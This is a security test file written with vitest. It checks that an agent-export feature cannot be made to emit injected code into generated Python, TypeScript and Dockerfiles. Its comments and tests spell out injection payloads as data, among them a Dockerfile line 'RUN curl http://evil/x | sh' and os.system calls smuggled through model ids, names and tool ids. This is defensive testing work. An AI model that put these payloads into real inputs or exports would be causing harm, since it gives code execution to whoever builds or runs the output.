// Agent export: the generated file is code somebody runs.
//
// Every exporter interpolates agent-controlled values into source — Python,
// TypeScript, a Dockerfile, YAML — and the user is expected to run or build the
// result. Nothing escaped them. Both of these were demonstrated working:
//
//   llm_model = 'gpt-4o", "x": __import__("os").system("id"), "y": "'
//     -> the AutoGen export emitted a VALID extra dict entry, executed on
//        import of the generated module.
//
//   llm_model = 'gpt-4o"\nRUN curl http://evil/x | sh\nENV Z="'
//     -> the Dockerfile gained a real RUN instruction, executed at build time.
//
// The path is: someone shares an agent, or sends an agent.json, the recipient
// exports it and runs the file. That is the export feature working exactly as
// designed, which is what makes it worth closing.
//
// Closed at the SOURCE rather than at each of ~48 interpolation sites, because
// per-language escaping solved forty-eight times is forty-eight chances to
// miss one, and model ids, providers and tool names all have a narrow
// legitimate charset.
import { describe, expect, it } from "vitest";

import {
  buildAgentManifest,
  buildAutoGenPython,
  buildDockerfile,
  buildLangChainTypeScript,
  buildStrandsTypeScriptSingle,
} from "@/lib/agentExport";
import { cleanModelId, safeIdentifier } from "@/lib/swarmExportTools";

const agent = (over: Record<string, unknown> = {}) =>
  ({
    id: "1",
    name: "Support Bot",
    description: "d",
    system_prompt: "be helpful",
    llm_provider: "openrouter",
    llm_model: "openai/gpt-4o",
    temperature: 0.7,
    max_tokens: 4096,
    tools: {},
    ...over,
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
  }) as any;

describe("real model ids survive untouched", () => {
  // A sanitiser that mangles legitimate input is a broken feature, not a safer
  // one. The first version excluded "/" and turned every gateway id into
  // `openaigpt-4o`.
  it("keeps the full gateway id in the manifest", () => {
    expect(buildAgentManifest(agent()).model.model).toBe("openai/gpt-4o");
    expect(
      buildAgentManifest(agent({ llm_model: "google/gemini-3-flash-preview" })).model.model,
    ).toBe("google/gemini-3-flash-preview");
  });

  it("still strips the prefix per generator", () => {
    expect(cleanModelId("google/gemini-3-flash-preview")).toBe("gemini-3-flash-preview");
    expect(cleanModelId("openrouter/openai/gpt-4o-mini")).toBe("gpt-4o-mini");
    expect(cleanModelId("anthropic/claude-sonnet-4.5")).toBe("claude-sonnet-4.5");
    expect(cleanModelId("meta-llama/llama-3.3-70b-instruct")).toBe("llama-3.3-70b-instruct");
    expect(cleanModelId("gpt-4o")).toBe("gpt-4o");
  });

  it("keeps ordinary providers", () => {
    for (const p of ["openrouter", "anthropic", "google", "azure-openai", "vllm"]) {
      expect(safeIdentifier(p, "openrouter")).toBe(p);
    }
  });
});

describe("generated Python cannot gain an extra statement", () => {
  // THE PROPERTY IS "CANNOT BREAK OUT OF THE LITERAL", NOT "CONTAINS NO SCARY
  // WORDS". A first version asserted the output did not contain `__import__`
  // or `os.system` — but the payload's letters survive as inert text inside a
  // quoted string, which is exactly the desired outcome. It also asserted
  // /^import os$/m was absent, which failed on the TEMPLATE'S OWN import line.
  // Both were matching substrings instead of checking structure.

  it("neutralises a dict-entry injection through the model id", () => {
    const py = buildAutoGenPython(
      agent({ llm_model: 'gpt-4o", "x": __import__("os").system("id"), "y": "' }),
    );
    // The value stays inside one pair of quotes: no `"` survives within it.
    const line = py.split("\n").find((l) => l.includes('"model":'))!;
    expect(line).toMatch(/^\s*"model": "[^"]*",$/);
    // And no second key was smuggled into the dict.
    expect(py.match(/"model":/g)).toHaveLength(1);
    expect(py).not.toContain('"x":');
  });

  it("escapes the system prompt rather than sanitising it", () => {
    // The prompt is prose and must keep its characters — JSON.stringify makes
    // it a valid literal, which is the right tool for a free-text field.
    const py = buildAutoGenPython(agent({ system_prompt: 'say "hi"\n"""\nimport os\n"""' }));
    expect(py).toContain('\\"hi\\"');
    // The whole prompt stays on ONE line: its newlines are escaped, so the
    // payload cannot become a statement of its own.
    //
    // NOT asserting the absence of "import os" — the generated file has a
    // legitimate `import os` in its own header, and a first version of this
    // test failed on that. Absence of a substring is the wrong question.
    const line = py.split("\n").find((l) => l.includes("system_message="))!;
    expect(line).toContain("\\n");
    expect(line).toMatch(/^\s*system_message="(?:[^"\\]|\\.)*",$/);
  });

  it("keeps the agent name out of the identifier position", () => {
    const py = buildAutoGenPython(agent({ name: 'Evil"); import os; os.system("id"); #' }));
    // Reduced to [A-Za-z0-9_], so it cannot close the call it sits inside.
    // The letters of the payload survive — that is fine, they are an
    // identifier now, not code.
    expect(py).toMatch(/^Evil[A-Za-z0-9_]* = AssistantAgent\($/m);
    // NOT asserting the absence of `Evil");` anywhere in the file: the name is
    // also printed in the header docstring, where those characters are inert
    // text and SHOULD survive. An earlier version of this line failed for that
    // reason — absence of a substring was the wrong question again.
  });

  it("cannot close the module docstring with the agent name", () => {
    // THIS TEST FOUND A LIVE BUG. The name was sanitised for the identifier
    // position two lines below and interpolated RAW into the docstring above
    // it, so this payload produced:
    //
    //   1| """AutoGen agent definition for x"""
    //   2| import os; os.system("id")
    //   3| """
    //
    // Line 2 runs on import of the generated module.
    //
    // The property is POSITIONAL: the payload must still be inside the leading
    // docstring, i.e. the closing delimiter comes after it. Asserting the
    // docstring "contains no delimiter" would be vacuous — indexOf finds the
    // first one, so the text before it never contains one by construction.
    const py = buildAutoGenPython(agent({ name: 'x"""\nimport os; os.system("id")\n"""' }));
    expect(py.startsWith('"""')).toBe(true);
    expect(py.indexOf('os.system("id")')).toBeLessThan(py.indexOf('"""', 3));
    // And the payload never became a line of its own.
    expect(py).not.toMatch(/^import os; os\.system/m);
    // Verified out-of-band with py_compile: the generated file parses, with
    // the payload as docstring prose.
  });

  it("emits no more docstring delimiters than the template itself", () => {
    // Whole-file count: an escape shows up as extra delimiters, wherever it
    // happens. Compares against a benign agent rather than a magic number, so
    // it survives edits to the header text.
    const payload = 'x"""\nimport os\n"""';
    const benign = buildAutoGenPython(agent()).match(/"""/g)!.length;
    for (const over of [{ name: payload }, { description: payload }]) {
      expect(buildAutoGenPython(agent(over)).match(/"""/g)!.length).toBe(benign);
    }
  });

  it("routes the description through an escaped position, not a docstring", () => {
    // Stating where the field actually lands: description reaches generated
    // Python only inside JSON.stringify (the default system message), never a
    // docstring. Escaping is right there — it is free text and must keep its
    // characters — so the test is that it stays ONE literal on ONE line.
    const py = buildAutoGenPython(
      agent({ system_prompt: "", description: 'd"""\nimport os\n"""' }),
    );
    const line = py.split("\n").find((l) => l.includes("system_message="))!;
    expect(line).toMatch(/^\s*system_message="(?:[^"\\]|\\.)*",$/);
    expect(line).toContain("\\n");
  });

  it("keeps an ordinary name readable in the header", () => {
    // A sanitiser that mangles legitimate input is a broken feature. Names are
    // prose — punctuation, accents and spacing must survive.
    const py = buildAutoGenPython(agent({ name: "Ravi's Support Bot (EMEA) — v2" }));
    expect(py).toContain("AutoGen agent definition for Ravi's Support Bot (EMEA) — v2");
  });
});

describe("the TypeScript generators have a comment header, not a docstring", () => {
  // ADDED BECAUSE A MUTATION SURVIVED. Removing safeTitle's `*/` handling broke
  // nothing in the suite: every escape test targeted Python. The TS generators
  // open with `/**` and put the name on the next line, so `*/` in a name ends
  // the comment and everything after it is code.
  const payload = "x*/\nprocess.exit(1);\n/*";

  it("a name cannot close the leading block comment", () => {
    const ts = buildLangChainTypeScript(agent({ name: payload }));
    expect(ts.startsWith("/**")).toBe(true);
    // Positional, same as the docstring case: the payload is still inside the
    // comment, so the terminator comes after it.
    expect(ts.indexOf("process.exit(1)")).toBeLessThan(ts.indexOf("*/"));
    expect(ts).not.toMatch(/^process\.exit/m);
  });

  it("holds for the Strands generator too", () => {
    const ts = buildStrandsTypeScriptSingle(agent({ name: payload }));
    expect(ts.indexOf("process.exit(1)")).toBeLessThan(ts.indexOf("*/"));
  });

  it("and for the Dockerfile, where a newline is the terminator", () => {
    // Three different terminators, three targets, one helper — which is the
    // reason it is a helper.
    const df = buildDockerfile(agent({ name: 'x\nRUN echo pwned\n# y"' }));
    expect(df).not.toMatch(/^RUN echo pwned/m);
    expect(df.split("\n")[0]).toContain("RUN echo pwned"); // inert, on the comment line
  });
});

describe("tool ids are object keys from the imported file", () => {
  // They arrive from agent.json exactly like the model id did, and reach
  // generated TypeScript inside a double-quoted literal with no escaping.
  const withTool = (id: string) => agent({ tools: { builtInTools: { [id]: true } } });

  it("cannot close the description literal in generated TypeScript", () => {
    const ts = buildLangChainTypeScript(withTool('x"); process.exit(1); //'));
    expect(ts).not.toContain("process.exit(1)");
    for (const line of ts.split("\n").filter((l) => l.includes("description:"))) {
      expect(line).toMatch(/^\s*description: "(?:[^"\\]|\\.)*",?$/);
    }
  });

  it("cannot close it in the Strands generator either", () => {
    // Two generators emit this same shape; fixing one and not the other is how
    // this codebase has drifted before.
    const ts = buildStrandsTypeScriptSingle(withTool('x"); process.exit(1); //'));
    expect(ts).not.toContain("process.exit(1)");
  });

  it("leaves every real built-in tool id untouched", () => {
    for (const id of [
      "kb_search",
      "web_search",
      "mcp_call_tool",
      "n8n_run_workflow",
      "sql_query",
    ]) {
      expect(buildAgentManifest(withTool(id)).tools.built_in).toEqual([id]);
    }
  });
});

describe("the Dockerfile cannot gain an instruction", () => {
  it("neutralises a newline-injected RUN", () => {
    const df = buildDockerfile(
      agent({ llm_model: 'gpt-4o"\nRUN curl http://evil/x | sh\nENV Z="' }),
    );
    expect(df).not.toMatch(/^RUN curl/m);
    // One ENV line per variable, not three.
    expect(df.match(/^ENV LLM_MODEL=/gm)).toHaveLength(1);
  });

  it("neutralises injection through the provider too", () => {
    const df = buildDockerfile(agent({ llm_provider: 'x"\nRUN echo pwned\nENV Y="' }));
    expect(df).not.toMatch(/^RUN echo pwned/m);
  });

  it("still emits the real values for a normal agent", () => {
    const df = buildDockerfile(agent());
    expect(df).toContain('ENV LLM_PROVIDER="openrouter"');
    expect(df).toContain('ENV LLM_MODEL="openai/gpt-4o"');
  });
});

describe("numbers interpolated bare are numbers", () => {
  // `temperature: ${...}` has no quotes around it in the generated Python and
  // TypeScript, so a non-numeric value is arbitrary code in the output.
  it("clamps out-of-range values", () => {
    expect(buildAgentManifest(agent({ temperature: 999 })).model.temperature).toBe(2);
    expect(buildAgentManifest(agent({ temperature: -5 })).model.temperature).toBe(0);
    expect(buildAgentManifest(agent({ max_tokens: 1e9 })).model.max_tokens).toBe(200_000);
    expect(buildAgentManifest(agent({ max_tokens: -1 })).model.max_tokens).toBe(1);
  });

  it("falls back for values that are not numbers at all", () => {
    expect(buildAgentManifest(agent({ temperature: "hot" })).model.temperature).toBe(0.7);
    expect(buildAgentManifest(agent({ temperature: null })).model.temperature).toBe(0.7);
    expect(buildAgentManifest(agent({ max_tokens: "x" })).model.max_tokens).toBe(4096);
  });

  it("never emits a non-numeric literal into generated Python", () => {
    const py = buildAutoGenPython(agent({ temperature: "1); import os; (" }));
    expect(py).toMatch(/"temperature": 0\.7,/);
    expect(py).not.toContain("import os;");
  });
});

describe("no exporter embeds a real credential", () => {
  it("reads keys from the environment instead", () => {
    const py = buildAutoGenPython(agent());
    expect(py).toContain('os.environ.get("OPENAI_API_KEY")');
    // Nothing that looks like an actual key value.
    expect(py).not.toMatch(/["'](sk|xox|AKIA|ghp)[-_]/);
  });
});
